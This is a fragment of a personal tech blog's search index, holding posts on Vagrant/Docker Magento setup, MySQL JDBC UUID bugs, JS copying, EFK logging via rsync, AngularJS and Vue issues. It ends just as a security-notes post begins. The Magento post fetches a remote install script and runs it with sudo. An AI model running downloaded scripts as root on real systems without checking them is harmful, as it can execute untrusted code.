夜间模式（实验中）","text":"更新了 Icarus 主题代码，右上角增加了夜间模式切换按钮，是实验中的功能，欢迎体验。 通过向 body 添加名为 night 的 class 实现，状态记在浏览器 localstorage 中。 已知问题： 样式可能没有全面覆盖。 夜间模式在低性能浏览器上导致页面响应缓慢，需要优化性能。 目前还没有做成插件，仅在自己的博客使用，后期如果有时间的话，会考虑做成 extension。 更新：已经发布了—— Icarus 2 请参考：如何给 Icarus 增加夜间模式Icarus 3 请参考：Icarus 夜间模式支持 3.0 了","link":"/2019/icarus-night-mode/"},{"title":"Windows 下通过 Vagrant 简单搭建 Magento","text":"准备软件 VirtualBox 5.2.8 Vagrant 2.0.1 官网下载安装，比我的新即可，安装路径自选。 创建 Vagrantfile新建文件夹并创建 Vagrantfile 放在里面，我配置的环境是 Ubuntu 16.04，内存8G，可以换成自己熟悉的环境。映射端口80，443（Web），3306（数据库），9200，9300（搜索引擎）。 Vagrantfile1234567891011Vagrant.configure(&quot;2&quot;) do |config| config.vm.box = &quot;ubuntu/xenial64&quot; config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 80 config.vm.network &quot;forwarded_port&quot;, guest: 443, host: 443 config.vm.network &quot;forwarded_port&quot;, guest: 3306, host: 3306 config.vm.network &quot;forwarded_port&quot;, guest: 9200, host: 9200 config.vm.network &quot;forwarded_port&quot;, guest: 9300, host: 9300 config.vm.provider &quot;virtualbox&quot; do |vb| vb.memory = &quot;8192&quot; endend 启动并连接到虚拟机在 Vagrantfile 所在目录执行 cmd12vagrant upvagrant ssh 虚拟机中安装 dockerbash123curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.shsudo apt-get install docker-compose 将当前用户加入 docker 用户组bash1234sudo usermod -aG docker $USER# 需要断开并重新连接以生效exitvagrant ssh 设置修改 VMA（虚拟内存区域）数值以保证 Elastic Search 可以顺利启动 bash1sudo sysctl -w vm.max_map_count=262144 部署 Magento, MariaDB, Elastic Search使用官方一键部署脚本部署。 bash12curl -sSL https://raw.githubusercontent.com/bitnami/bitnami-docker-magento/master/docker-compose.yml &gt; docker-compose.ymldocker-compose up -d 查看运行状态bash123456docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES50d5ccd79dbf bitnami/magento:2 &quot;/app-entrypoint.sh …&quot; 6 hours ago Up 6 hours 0.0.0.0:80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp vagrant_magento_158577f4b0595 bitnami/mariadb:10.2 &quot;/entrypoint.sh /run…&quot; 7 hours ago Up 6 hours 3306/tcp vagrant_mariadb_13c217cc1492e bitnami/elasticsearch:6 &quot;/entrypoint.sh /run…&quot; 7 hours ago Up 7 hours 9200/tcp, 9300/tcp vagrant_elasticsearch_1 在 Windows 中打开 http://127.0.0.1，检查是否能够正常访问。 默认后台：http://127.0.0.1/index.php/admin/默认用户：user默认密码：bitnami1 遇到问题 执行 docker logs [容器ID] 查看 log 查看官方文档：https://github.com/bitnami/bitnami-docker-magento/blob/master/README.md","link":"/2019/install-magento-on-windows/"},{"title":"MySQL JDBC 在查询中调用 REPLACE(UUID(),&#39;-&#39;,&#39;&#39;) 查出重复的 UUID","text":"MySQL版本是5.7.25，最近升级了JDBC驱动，5.1.45 -&gt; 8.0.13，导致一个SQL报异常，SQL是用一个子查询，拿到数据后插入到另一张表用的。 123INSERT INTO table_2 (id, title, modified_date)(SELECT REPLACE(UUID(),'-','') AS id, table_1.title AS title, NOW() AS modified_dateFROM table_1) 可见table_2的id是在子查询中，用REPLACE(UUID(),'-','')生成的。 这样的语句在MySQL 5.7.25命令行模式下，Workbench下，JDBC 5.1.45下都没有问题，但是JDBC升级到8.0.13后，却报了主键重复的异常。 ERROR SqlExceptionHelper - Duplicate entry 'ae3867585cc611e986e30e045157562c' for key 'PRIMARY' 于是搜索，在Stack Overflow上搜索到了相关问题，注意最佳答案似乎不准确，但后面的一个答案给予了我一些启示。 https://stackoverflow.com/questions/9750536/mysql-uuid-duplication-bug uuid()output is utf8, no matter what your charset is ; when your charset client and charset result is some of high priority than utf8 such as utf8mb4 , then the inexplicit conversion happen,other lower priority charset like latin1 that work fine; inexplicit conversion will turn uuid() into constant string before sql execute,so after sql execute finish , the same uuid() return 新建一个工程，写一个简单的JDBC demo，从MySQL查询SELECT REPLACE(UUID(),'-','') from settings 当JDBC版本为5.1.45时 当JDBC升级到8.0.13时，相同的查询语句，返回了不一样的结果 隐式转换会将UUID()的返回值从UTF8转换成优先级更高的UTF8MB4，转换过程导致结果成为了常量。 推荐的解决办法是： 将隐式转换改为显式转换例如： 12REPLACE(CONVERT(UUID() USING utf8mb4), '-', '')REPLACE(UUID(), _utf8'-', _utf8'') 两条语句都可以。 那就这样改呗，又发现Hibernate会对以上statement自动预处理成以下的样子 12REPLACE(CONVERT(UUID() USING[*] utf8mb4),'-','')REPLACE(UUID(),_UTF8'-'[*],_UTF8'') 这显然会造成语法错误啊！ 尴尬，继续搜索了为什么Hibernate会往查询语句里加[*]，没有找到答案，最接近的问答在这里：https://stackoverflow.com/questions/55040454/cant-find-an-error-in-sql-update-statement 在数据库连接字符串中加入&amp;connectionCollation=utf8_general_ciMySQL Connector/J 8.0 Developer Guide / Connector/J Reference / Using Character Sets and Unicodehttps://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-charsets.html 因为没有utfmb3可以与连接选项charaterEncoding一起使用的Java样式字符集名称 ，所以utf8mb3用作连接字符集的唯一方法是对连接选项使用utf8mb3 collation（例如utf8_general_ci）的connectionCollation，这会强制设置utf8mb3字符集如上一篇文章中所解释的那样使用。 1234String jdbcUrl = &quot;jdbc:mysql://localhost:3306/test&quot; + &quot;?useUnicode=true&quot; + &quot;&amp;characterEncoding=UTF-8&quot; + &quot;&amp;connectionCollation=utf8_general_ci&quot;; 因为新版的JDBC默认连接编码为UTF8MB4这会让JDBC连接时不再执行SET NAMES utf8mb4 已在上面的demo中测试这是起作用的。 但是： 对于大项目修改连接字符串的风险比较高； UTF8MB4可以存储和传输emoji表情，拥有更良好的兼容性，退到UTF8MB3不是好策略。 去掉REPLACE()函数最后还是整个去掉了REPLACE…… 123INSERT INTO table_2 (id, title, modified_date)(SELECT UUID() AS id, table_1.title AS title, NOW() AS modified_dateFROM table_1) 注：因为ID是VARCHAR(45)的，所以能装得下UUID()的返回值。 附：经不完全测试，存在此问题的函数12REPLACE(UUID(),'-','')CONCAT(UUID(),'-') 不存在此问题的函数 1SUBSTRING(UUID(),1,36)","link":"/2019/jdbc-uuid-duplication/"},{"title":"JS 原生对象与数组拷贝","text":"浅拷贝单层对象12let obj = { id: 1, title: &quot;1&quot; }let copyOfObj = Object.assign({}, obj) 深拷贝多层对象1234567let obj = { id: 1, title: &quot;1&quot;, tag: ['js', 'javascript'], category: { id: 1001, title: 'frontend' }}let copyOfObj = JSON.parse(JSON.stringify(obj)) 浅拷贝简单类型数组12let arr = [1, 2, 3]let copyOfArr = [...arr] 深拷贝单层对象组成的数组1234567let arr = [ { id: 1, title: &quot;1&quot; }, { id: 2, title: &quot;2&quot; }, { id: 3, title: &quot;3&quot; }]let copyOfArr1 = arr.map((item) =&gt; Object.assign({}, item))let copyOfArr2 = JSON.parse(JSON.stringify(arr)) 深拷贝多层对象组成的数组1234567let arr = [ { id: 1, title: &quot;1&quot;, subObj: { name: 'subObj1' } }, { id: 2, title: &quot;2&quot;, subObj: { name: 'subObj2' } }, { id: 3, title: &quot;3&quot;, subObj: { name: 'subObj3' } }]let copyOfArr1 = arr.map((item) =&gt; JSON.parse(JSON.stringify(item)))let copyOfArr2 = JSON.parse(JSON.stringify(arr)) 总结不考虑性能的情况下，JSON.parse(JSON.stringify(value))是最简最万能的拷贝。","link":"/2019/js-deep-copy/"},{"title":"负载均衡：ELB, ALB, NLB, CLB","text":"负载均衡的作用对多台云服务器进行流量分发的服务。负载均衡可以通过流量分发扩展应用系统对外的服务能力，通过消除单点故障提升应用系统的可用性。 提高可用性和访问速度在单个可用区或多个可用区内的多个目标之间自动分配流量。 运行状况检查检测无法正常运行的目标、停止向它们发送流量，然后将负载分散到剩余的正常运行的目标上。 安全性功能创建和管理与负载均衡器关联的安全组，以提供更多联网和安全选项。 TLS 终止提供集成化证书管理和 SSL/TLS 解密，可以灵活地集中管理负载均衡器的 SSL 设置，并从应用程序上卸载 CPU 密集型工作。 Amazon 提供的 ELB 服务包含三种类型：ALB, NLB, CLB。 ALBApplication Load Balancer 运行于请求级别（第 7 层），可根据请求的内容将流量路由至 EC2 实例、容器、IP 地址和 Lambda 函数等目标。Application Load Balancer 最适合 HTTP 和 HTTPS 流量的高级负载均衡，面向交付包括微服务和基于容器的应用程序在内的现代应用程序架构，提供高级请求路由功能。Application Load Balancer 通过确保始终使用最新的 SSL/TLS 密码和协议，简化并提高应用程序的安全性。 ABL于2016年8月发布，与现有的负载均衡器（OSI第4层TCP/UDP均衡器）不同，ALB将查看数据包并将其发送到正确的服务。单个ALB可以为许多后端服务平衡流量，而不是为每个服务运行弹性负载均衡器。例如，包含的URL /api可以路由到与包含的URL /signup不同的后端服务。 NLBNetwork Load Balancer 网络负载均衡器运行于连接级别（第 4 层），可根据 IP 协议数据将连接路由至 Amazon Virtual Private Cloud (Amazon VPC) 内的不同目标（Amazon EC2 实例、微服务和容器）。网络负载均衡器最适合 TCP 流量的负载均衡，能够在保持超低延迟的同时每秒处理数百万个请求。网络负载均衡器还经过了优化，能够处理突发的和不稳定的流量模式，同时在每个可用区使用单个静态 IP 地址。它与其他流行的 AWS 服务集成，例如 Auto Scaling、Amazon EC2 Container Service (ECS)、Amazon CloudFormation 和 Amazon AWS Certificate Manager (ACM)。 CLBClassic Load Balancer 同时运行于请求级别和连接级别，可在多个 Amazon EC2 实例之间提供基本的负载均衡。Classic Load Balancer 适用于在 EC2-Classic 网络内构建的应用程序。在使用 Virtual Private Cloud (VPC) 时，我们建议使用第 7 层 Application Load Balancer 和第 4 层网络负载均衡器。 使用 CLB 而不是 ALB 具有以下优势： 支持 EC2-Classic 支持 TCP 和 SSL 侦听器 支持使用应用程序生成的 cookie 的粘性会话 CLB速度慢于ALB。 参考文档 Elastic Load Balancing 功能 负载均衡 - 文档中心 - 腾讯云 AWS Launches Application Load Balancer 封面来源: pixabay, free for commercial use.","link":"/2019/load-balancing/"},{"title":"纯本地搭建 EFK 管理远程服务器日志","text":"项目staging环境日志难以搜索，计划搭建EFK管理日志，但是EFK内存消耗太大，再新增云服务器不划算，打算搭建在本地（16G内存）。 什么是 EFKEFK不是一个软件，而是一套解决方案，并且都是开源软件，其中 ELasticsearch 负责日志保存和搜索，FileBeat 负责收集日志，Kibana 负责界面。 ElasticsearchElasticsearch是个开源分布式搜索引擎，提供搜集、分析、存储数据三大功能。它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。 FileBeatFilebeat 隶属于 Beats，搜集日志数据并上载到 Elasticsearch、Logstash、Redis 等平台。 KibanaKibana 提供日志分析的友好 Web 界面，可以帮助汇总、分析和搜索重要数据日志。 环境现状 本地环境：Windows 10，Intel(R) Core(TM) i5-7500 CPU，内存 16G 远程环境：SUSE Linux Enterprise Server 11，可用内存不足 1G 本地可以启虚拟机，但没钱买额外的云服务器。 最初想法目前有3种思路： 本地启动Elasticsearch、Kibana、Filebeat，服务器启动FTP，并映射到本地网络驱动器，Filebeat配置从网络驱动器读取log。 本地启动Elasticsearch、Kibana，用反向代理工具FRP暴露Elasticsearch的9200端口到公网（注意配置鉴权），远程启动Filebeat，输出到本地的Elasticsearch。 本地启动Elasticsearch、Kibana，Logstash，远程启动Filebeat、Redis，远程的Filebeat输出到Redis，本地的Logstash从Redis上读取，转发给Elasticsearch。 方案确定以上的三种方案都存在阻力： 不能稳定映射，经常断开，且I/O速度太慢 反向代理工具不能在公司中使用 配置较复杂 睡一觉之后产生了第4种方案：4. 本地启动Elasticsearch、Kibana、Filebeat，循环执行rsync命令，SSH连接到服务器并把log增量同步到本地，本地Filebeat就可以畅快地读取了 动手搭建Elasticsearch、Kibana由于资源消耗大，决定在Windows环境下启动rsync 由于是 Linux 下的，只能在虚拟 Ubuntu 下启动Filebeat 由于 log 在 Ubuntu 下，为了I/O效率，也在 Ubuntu 下启动 启动 E &amp; K安装 Kibanahttps://www.elastic.co/guide/en/kibana/current/windows.html 安装 Elasticsearchhttps://www.elastic.co/guide/en/elasticsearch/reference/current/getting-started-install.html 请参考官方安装文档进行安装，本教程所用配置如下： elasticsearch.yml12network.host: [_local_, _site_]http.port: 9200 kibana.yml123server.port: 5601server.host: &quot;0.0.0.0&quot;elasticsearch.url: &quot;http://localhost:9200&quot; 启动虚拟机这里使用Vagrant启动，安装Virtualbox和Vagrant，创建Vagrantfile如下 Vagrantfile123456Vagrant.configure(&quot;2&quot;) do |config| config.vm.box = &quot;ubuntu/xenial64&quot; config.vm.provider &quot;virtualbox&quot; do |vb| vb.memory = &quot;8192&quot; endend 同目录下执行 vagrant up，然后 vagrant ssh 连接上虚拟机。 启动 Filebeat安装Filebeat12curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.3.2-amd64.debsudo dpkg -i filebeat-6.3.2-amd64.deb 配置Filebeat1sudo vim /etc/filebeat/filebeat.yml 这是common的配置，请按照自己项目的log格式配置相应的插件。10.0.2.2 代表宿主机，如果你用的也是Virtualbox + Vagrant，不要改动。 filebeat.yml1234567891011121314151617filebeat.inputs:- type: log enabled: true paths: - /home/vagrant/logs/*filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: falsesetup.template.settings: index.number_of_shards: 3setup.kibana: host: &quot;10.0.2.2:5601&quot;setup.template.name: &quot;filebeat&quot;setup.template.pattern: &quot;filebeat-*&quot;output.elasticsearch: hosts: [&quot;10.0.2.2:9200&quot;] index: &quot;filebeat-%{+yyyy.MM.dd}&quot; 确保前面已经启动Elasticsearch和Kibana，然后启动Filebeat，sudo service filebeat start 从server端增量同步log首先服务器必须开启ssh_key登录，在Ubuntu下生成ssh配置到服务器的 authorized_keys 中。 执行 byobu，这会开一个终端 session，在此执行的命令不会因为终端退出而终止。 快捷键 作用 F2 新建一个窗口 F3 切换到上一个窗口 F4 切换到上一个窗口 F7 浏览当前窗口的历史打印信息 F6 让 byobu 到后台去 Ctrl + F6 关闭当前窗口 修改以下命令，并执行实现增量同步： 1while true;do rsync -rtv --include &quot;**.log&quot; --exclude &quot;*.*&quot; --append -e &quot;ssh -p &lt;服务器SSH端口号&gt;&quot; &lt;服务器登录用户名&gt;@&lt;服务器地址&gt;:/var/logs /home/vagrant;sleep 5;done; 这个命令很长，所以给出命令解释： while true 循环执行 -rtv r代表递归目录，t代表保留待同步文件的修改时间，v代表啰嗦模式，输出更多同步信息（可以-vv更啰嗦模式） --include &quot;**.log&quot; --exclude &quot;*.*&quot; 只同步log文件 --append 增量同步，会比较文件大小，只同步多出来的部分 -e &quot;ssh -p &lt;服务器SSH端口号&gt;&quot; 自定义SSH程序命令行，自定义端口 /var/logs /home/vagrant 同步服务器的 /var/logs 目录到本地的 /home/vagrant 下 sleep 5 同步每次结束后休息5秒，避免过多占用服务器带宽 有兴趣的童鞋可以到这里学习rsync命令的更多用法：https://www.cnblogs.com/f-ck-need-u/p/7221713.html 撒花按F6把循环进程切到后台，稍等片刻后访问 http://localhost:5601/，看看能否查询到 log 了 如果历史log量很大，首次启动后会处理大量的log，短时间内查出大量的log是正常现象。","link":"/2019/local-efk-analyze-remote-log/"},{"title":"AngularJS Material制作气泡弹出效果","text":"点击一个按钮后需要弹出一个对话气泡，气泡内有各种设置项，点击外侧可以退出。 现在的效果： 在线测试：https://codepen.io/iMaeGoo/pen/KYVRGL 开始的设计图： 实际应用： 使用AngularJS Material v1.1.1版本，基于md-menu实现，就不难了，还赠送动画效果。 但是md-menu弹出来的只能是一个方形区域，怎么画出来气泡柄呢？ 我们知道盒模型中，border在角落处是斜向延伸的，即：四个方向的每个border都是个梯形，当内容宽度、高度都设为0时，就成了下图的样子，阴影区域其实是border-bottom： 123456.right-triangle { width: 0; height: 0; border: solid 20px transparent; border-bottom-color: grey;} 好了，基于这个特性，画出了直角三角形，但是需要对阴影和menu整体设置一个阴影，否则仍不完美。 代码： CSS123456789101112131415161718.md-open-menu-container { box-shadow: 0 1px 8px 0 rgba(0, 0, 0, 0.2);}.bubble-content { width: 300px; height: 200px;}.md-open button:after { content: ''; position: absolute; border: solid 8px transparent; border-bottom-color: white; left: 50px; top: 20px; pointer-events: none;} JS1234567angular .module('menuDemoBasic', ['ngMaterial']) .controller('BasicDemoCtrl', function DemoCtrl($mdDialog) { this.openMenu = function($mdOpenMenu, ev) { $mdOpenMenu(ev); }; }); HTML1234567891011121314&lt;div class=&quot;md-menu-demo&quot; ng-app=&quot;menuDemoBasic&quot; ng-controller=&quot;BasicDemoCtrl as ctrl&quot;&gt; &lt;div class=&quot;menu-demo-container&quot; layout-align=&quot;center center&quot; layout=&quot;column&quot;&gt; &lt;md-menu md-position-mode=&quot;target-left bottom&quot;&gt; &lt;md-button class=&quot;md-raised md-primary md-button md-ink-ripple&quot; ng-click=&quot;ctrl.openMenu($mdOpenMenu, $event)&quot;&gt; show bubble &lt;/md-button&gt; &lt;md-menu-content&gt; &lt;div class=&quot;bubble-content&quot; layout-align=&quot;center center&quot; layout=&quot;column&quot;&gt; &lt;p&gt;Something in the bubble&lt;/p&gt; &lt;/div&gt; &lt;/md-menu-content&gt; &lt;/md-menu&gt; &lt;/div&gt;&lt;/div&gt; 下一步准备研究一下阴影的问题，欢迎提意见。","link":"/2019/md-bubble/"},{"title":"Make simple &lt;md-chip&gt; work without &lt;md-chips&gt; in AngularJS Material?","text":"I’m using AngularJS Material v1.1.1.I’m finding a way to use simple &lt;md-chip&gt; without &lt;md-chips&gt;. Here is an easy way in Vue Material: https://codesandbox.io/s/lyoqv4l0z?module=App.vue 1&lt;md-chip class=&quot;md-primary&quot; md-deletable&gt;Deletable&lt;/md-chip&gt; But I can not find the similiar way in AngularJS Material document.https://material.angularjs.org/latest/api/directive/mdChip Here is my code:https://codepen.io/iMaeGoo/pen/EJaaqp 1234567891011121314&lt;body ng-app=&quot;myApp&quot; ng-controller=&quot;AppCtrl&quot;&gt; &lt;p&gt; &lt;md-chips ng-model=&quot;chips&quot;&gt; &lt;md-chip-template&gt; {{ $chip }} &lt;/md-chip-template&gt; &lt;/md-chips&gt; &lt;/p&gt; &lt;p&gt; &lt;!-- I want to make this simple md-chip work here --&gt; &lt;md-chip&gt;{{oneChip}}&lt;/md-chip&gt; &lt;/p&gt;&lt;/body&gt; 1234angular.module('myApp',['ngMaterial']).controller('AppCtrl', function($scope) { $scope.chips = [&quot;A chip in chips!&quot;]; $scope.oneChip = &quot;A chip without chips!&quot;;}); One workaround is to rewrite CSS. 1234567891011121314151617md-chips { md-chips-wrap { border: none; padding: 0; box-shadow: none; cursor: inherit; width: fit-content; ._md-chip-input-container { display: none; } } md-chip { margin: 0; }} 123&lt;md-chips class=&quot;chips&quot; ng-model=&quot;chips&quot; md-max-chips=&quot;1&quot;&gt; &lt;md-chip-template&gt;{{ $chip }}&lt;/md-chip-template&gt;&lt;/md-chips&gt; 123angular.module('myApp', ['ngMaterial']).controller('AppCtrl', function($scope) { $scope.chips = [&quot;One chip&quot;];}); See: https://codepen.io/iMaeGoo/pen/BEyKem The chip is still in chips component. It is not a good idea. Feel free to answer if you have better idea!https://stackoverflow.com/questions/55455225/how-to-make-simple-md-chip-work-without-md-chips-in-angularjs-material","link":"/2019/md-chip-without-md-chips/"},{"title":"小米 MIUI 10 锁屏画报原图批量提取","text":"需要 ROOT 权限 用 ES、MT、RE 等类型的文件管理器复制以下目录到内部存储/data/data/com.mfashiongallery.emag/files/img_cache/ 将复制出来的文件批量重命名，添加 jpg 后缀","link":"/2019/miui-fashion-gallery/"},{"title":"MySQL 查询有哪些表关联了指定表","text":"1select * from INFORMATION_SCHEMA.KEY_COLUMN_USAGE where REFERENCED_TABLE_NAME='[表名]'","link":"/2019/mysql-referenced-table/"},{"title":"让 MySQL Workbench 直接显示 BLOB 字段的内容","text":"使用MySQL Workbench，查询一个带BLOB字段的表时： 1SELECT * FROM mysql.general_log ORDER BY event_time; 只能看到一个BLOB图标。 直接做法右键BLOB字段，Open Value in Viewer（hmmmm，谁都知道啊，但是好笨啊！不能一次看完吗？） SQL CONVERT 做法在查询中使用CONVERT函数处理BLOB字段 1SELECT *, CONVERT(argument USING utf8) FROM mysql.general_log ORDER BY event_time; 这样就很清晰啦（图有误）： 作为非二进制字符串处理 BINARY / VARBINARY Go to Edit &gt; Preferences Choose SQL Queries Under Query Results, check Treat BINARY/VARBINARY as nonbinary character string It’s not mandatory to restart MySQL Workbench (you will not be prompted or informed of this requirement).* 这个方法来自Stack Overflow，我没有成功验证这个方法，设置之后无效，有点奇怪。","link":"/2019/mysql-workbench-show-blob/"},{"title":"粘性布局之粘底效果（position sticky, bottom 0）","text":"经常在查资料时访问各种 CSDN 博客会发现，当 屏幕高度 &lt; 左边栏的高度 &lt; 内容的高度 时，滚动屏幕，左边栏会随着内容一同滚动，当滚动到左边栏底部时，左边栏会停止滚动，而内容会继续滚动。 这种设计的优势在于，用户既能够滚动左边栏，又不会在左边栏不够长时，造成页面左侧大片空白的尴尬，这种布局模式，叫做 粘性布局（sticky）。 粘性布局在元素满足显示条件时，表现与普通布局没什么不同，但当元素随着页面滚动而无法显示时，会转为 fixed 布局效果，主流浏览器已经全部支持粘性布局（IE不支持）。 通俗一点讲，类似于 Excel 中的“冻结窗格”。 绝大多数网上的教程材料都用 position: sticky; top: 0; 这样的组合来举例，但为了实现 CSDN 左边栏效果，position: sticky; bottom: 0; 似乎不能和想象一样的起作用。 先说结论吧 sticky 的确是无法直接粘底的…… CSDN 使用 JS 动态计算实现，当计算到左边栏底部即将滚上屏幕时，立即对左边栏添加 position: fixed; bottom: 0; 样式，把左边栏定死，延时较为明显，快速上下滚动时能看到闪烁。 我使用 position: sticky; 实现，通过 JS 计算 屏幕高度 - 左边栏高度 得到 top 的值，快速滚动时没有闪烁。 发现的过程 发现 position: sticky; bottom: 0; 不起作用后，上网搜索也并未查到结果。 F12 研究 CSDN 的实现方式，发现其依赖于滚动事件，如此实现避免不了延迟和过度计算的问题，决定再找方法。 既然 bottom 起不了效果，就尝试设置 top 为负值，果然能够控制元素向上移动， 但 top 的取值依赖于左边栏自身的高度，CSS 怎么拿到自身的高度呢？ 想到 calc，就写出了 top: calc(100vh - height) 这样的句子…… 不管用。 摸索了半天 calc 的用法，发现确实是用不成了，calc 拿不到元素自身高度，只能写 JS 了。 最终通过 JS 完成了这样的需求。 123456789101112131415161718192021// 仿 CSDN 左侧栏吸底效果，设置 position 为 sticky，top 为屏幕高度减去左侧栏高度，比 CSDN 的实现更简洁。var columnLeft = $('.column-left')[0];function fixLeftColumnTop() { // 小屏忽略，因为小屏没有左边栏 if ($(window).width() &lt; 769) { columnLeft.style.top = null; } else { if (columnLeft) { // 屏幕高度 - 左边栏高度 - 左边栏距离底部的保留距离 columnLeft.style.top = $(window).height() - columnLeft.scrollHeight - 10 + 'px'; } else { // 左边栏还没加载出来，等 500 毫秒再找 setTimeout(function () { columnLeft = $('.column-left')[0]; fixLeftColumnTop(); }, 500); } }}fixLeftColumnTop();$(window).resize(fixLeftColumnTop); 如果你也想用这段代码，别忘了把 .column-left 替换成你的粘性元素的选择器，并在那个元素上添加 position: sticky; 样式~ 另外一个小发现Windows 环境，缩放 100% 下，当 top 的值为非整数像素值时，Chrome 会有元素内字体模糊的情况，Firefox 和 Edge 没有问题，所以有必要对 top 取整确保字体清晰。","link":"/2019/position-sticky-bottom/"},{"title":"Vagrant 修改 box 保存位置 &amp; 虚拟机位置到非系统盘","text":"修改 box 保存位置在环境变量中添加： 修改虚拟机保存位置打开VirtualBox，选择File-&gt;Preferences，修改Default Machine Folder：","link":"/2019/vagrant-path/"},{"title":"van-list 一直触发加载问题的排查","text":"移动端分页一般都是向下滑动加载更多，Vant 组件库提供了 van-list 来实现这一功能。 List 组件通过loading和finished两个变量控制加载状态，当组件滚动到底部时，会触发load事件并将loading设置成true。此时可以发起异步操作并更新数据，数据更新完毕后，将loading设置成false即可。若数据已全部加载完毕，则直接将finished设置成true即可。 实际应用中发现，即使内部元素已经填满一整屏，仍然会触发加载，直到我模拟的20多页全部加载完才停下来。 我没有给这个问题写专门的 CodePen demo，比较麻烦，碰到的人也不一定多。 结论van-list 会在内容之后增加一个 placeholder，通过 placeholder 的位置判断内容是否已填充满屏。van-list 本身为 flex 布局时，flex-direction 必须是 column（或 column-reverse）。 过程首先我的用法是这样的： template1234567&lt;van-list&gt; &lt;!-- flex --&gt; &lt;van-grid&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;/van-grid&gt;&lt;/van-list&gt; 首先看文档，英文文档没有提到，但中文文档有以下一段话： 使用 float 布局后一直触发加载？若 List 的内容使用了 float 布局，可以在容器上添加van-clearfix类名来清除浮动，使得 List 能正确判断元素位置 检查了一下，我没有在使用 float 布局呀。 那看一下Vant源码，主要看Vant是如何判断页面何时去加载的： check()1234567891011121314151617181920212223242526272829303132333435363738this.$nextTick(() =&gt; { if (this.loading || this.finished || this.error) { return; } const { $el: el, scroller, offset, direction } = this; let scrollerRect; if (scroller.getBoundingClientRect) { scrollerRect = scroller.getBoundingClientRect(); } else { scrollerRect = { top: 0, bottom: scroller.innerHeight }; } const scrollerHeight = scrollerRect.bottom - scrollerRect.top; /* istanbul ignore next */ if (!scrollerHeight || isHidden(el)) { return false; } let isReachEdge = false; const placeholderRect = this.$refs.placeholder.getBoundingClientRect(); if (direction === 'up') { isReachEdge = placeholderRect.top - scrollerRect.top &lt;= offset; } else { isReachEdge = placeholderRect.bottom - scrollerRect.bottom &lt;= offset; } if (isReachEdge) { this.$emit('input', true); this.$emit('load'); }}); scrollerRect 是滚动区域的位置，通过 debug 看到获取到的值没有问题，但 placeholderRect 的值一直都是同一个值，导致 isReachEdge 一直是 true。 进一步 inspect 页面元素，发现这个 placeholder 的位置在这里： template12345678&lt;van-list&gt; &lt;van-grid&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;/van-grid&gt; &lt;div class=&quot;van-list__placeholder&quot;&gt;&lt;/div&gt; &lt;!-- placeholder --&gt;&lt;/van-list&gt; placeholder 是一个没有大小的 div，由于 van-list 是 flex 横向布局，placeholder 自然地落在了 van-grid 的右边，这时不管 van-grid 怎么高，placeholder 的位置都不变了。 知道了问题所在，我们在 van-list 元素上增加了 flex-direction: column; 成功地解决了问题。","link":"/2019/van-list-always-load/"},{"title":"VS Code 写 C# 怎样自动导包（Auto-using）","text":"在 Visual Studio 中可以使用 Alt + Shift + F10 来自动导包，在 VS Code 中怎么操作呢？ 快捷键是 Ctrl + .（句点）。 坑：必须在英文状态下按快捷键才能起作用。 如果你还没有安装安装并配置 VS Code 的 csharp 插件，这个快捷键可能不起作用。 在 Extensions 页搜索安装 C# 重新打开项目，会弹出提示，选择是 等待 Output 输出 Finished 来源：https://stackoverflow.com/questions/148977/visual-studio-keyboard-shortcut-to-automatically-add-the-needed-using-statemenhttps://docs.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code","link":"/2019/vscode-csharp-auto-using/"},{"title":"直接操作 Vue data 中不存在的属性导致的 v-model 绑定异常问题","text":"初学Vue遇到的问题，尝试了几个小时才搞明白，大佬应该一眼就能看出什么问题吧…… 需要注意，不要直接在JS中操作一个Vue data对象中不存在的属性，如果同时有通过v-model绑定到该对象的不存在的属性时，会出现诡异的行为表现，console中不会报出任何 warn 或 error。 需求是，实现三个复选框，第一个复选框初始为选中状态，一开始写出来是这样的—— HTML12345&lt;div id=&quot;app&quot; style=&quot;margin: 10px;&quot;&gt; &lt;van-checkbox v-for=&quot;box in checkboxes&quot; :key=&quot;box.id&quot; v-model=&quot;box.selected&quot;&gt; 复选框 {{ box.title }} &lt;/van-checkbox&gt;&lt;/div&gt; JS123456789101112131415new Vue({ el: '#app', data () { return { checkboxes: [ { id: 1, title: 'a' }, { id: 2, title: 'b' }, { id: 3, title: 'c' } ] } }, created () { this.checkboxes[0].selected = true }}) 试下效果： See the Pen vue-v-model-not-work by iMaeGoo (@iMaeGoo) on CodePen. 复选框a的表现显然是异常的，点击不能成功地切换选中状态，而在点击之后再点击其他复选框，才会“有延迟地”切换状态。 为什么会这样？尝试在created方法的末尾打印出this.checkboxes[0]—— 发现 id 和 title 都变成了 getter/setter 的形式，而 selected 仍然是独立的属性。 后续查询发现，Vue 官方文档 - 深入响应式原理 的第一段话是—— 当你把一个普通的 JavaScript 对象传入 Vue 实例作为 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter。Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是 Vue 不支持 IE8 以及更低版本浏览器的原因。 在 created 方法中，我尝试直接对 Vue data 对象中的属性操作，而 v-model 需要使用 getter/setter 操作，二者即产生了冲突。 解决方式 1在 data 中添加 selected 属性，即使初值为undefined或者null，也能够让 Vue 正确识别所有对象属性。 JS123456789data () { return { checkboxes: [ { id: 1, title: 'a', selected: undefined }, { id: 2, title: 'b', selected: undefined }, { id: 3, title: 'c', selected: undefined } ] }} 解决方式 2在JS中操作原本不存在的属性时，使用 Vue.set(object, propertyName, value) 方法向嵌套对象添加响应式属性 JS1234created () { // Vue.set 等同 this.$set this.$set(this.checkboxes[0], 'selected', true)}","link":"/2019/vue-model-not-work/"},{"title":"XSS, CSRF, CRLF, SQL注入学习笔记","text":"XSS, CSRF, CRLF, 